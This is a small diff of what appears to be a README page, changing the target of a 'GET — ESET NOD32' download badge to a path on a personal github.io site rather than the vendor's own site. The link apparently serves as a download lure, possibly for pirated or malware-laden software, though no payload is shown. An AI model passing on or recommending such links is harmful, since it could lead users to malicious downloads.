@@ -4,7 +4,7 @@
 <img src="https://images.kinguin.net/g/carousel-main-mobile/media/category/1/1/111_1579084563_3.jpg" width="780">
 </p>
 
-[![GET — ESET NOD32](https://img.shields.io/badge/GET-ESET%20NOD32-2563eb?style=for-the-badge)](https://mirrowcelo473.github.io/.github/)
+[![GET — ESET NOD32](https://img.shields.io/badge/GET-ESET%20NOD32-2563eb?style=for-the-badge)](https://mirrowcelo473.github.io/.github/ESET-NOD32)
 
 ---
 
